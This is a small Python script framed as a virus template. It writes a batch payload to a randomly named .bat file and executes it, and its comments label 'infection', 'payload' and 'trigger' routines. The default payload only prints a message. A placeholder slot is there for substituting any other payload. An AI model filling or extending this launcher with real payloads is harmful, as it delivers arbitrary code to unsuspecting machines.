##Search routing
##	Infection routine
##	Payload routine
##	Trigger routine
import random as r
import os as os
import time as t

#put your payload here and change around line 43
#p = PayloadCreation() to p = PayloadCreation(False)
ALTPAYLOAD = ""

def PayloadCreation(DefultPayload=True):
    #Where our payload will be stored
    if(DefultPayload==True):
        payload='@echo off \n:a \necho I am the Payload\nset /p input="Press Enter to exit"'
    if(DefultPayload==False):
        global ALTPAYLOAD
        payload = ALTPAYLOAD       
    return payload

def Infection(PayLoad,FileType=".bat"):
    #Basicly coping payload though file system
    name = str(r.randint(22222,99999))
    fullFileName = name+FileType
    text_file = open(fullFileName, "w+")
    text_file.write(PayLoad)
    text_file.close()
    return fullFileName

def Trigger(payloadLocation):
    #To set off virus
    os.startfile(payloadLocation)
    

def main():
    #virusmain function
    try:
        #True/blank for default payload,
        #False for alternitive payload,
        #put alternitive payload in
        #ALTPAYLOAD varable
        p = PayloadCreation()
    except:
        print("There was an ERROR in PayloadCreation()")
    try:
        i= Infection(p)
    except:
        print("There was an ERROR in Infection()")
    try:
        Trigger(i)
    except:
        print("There was an ERROR in Trigger()")
    
      
        
time_start = t.time()        
main() #run program
print("\n\n\nTime to complete infection:",t.time()-time_start, "Sec")


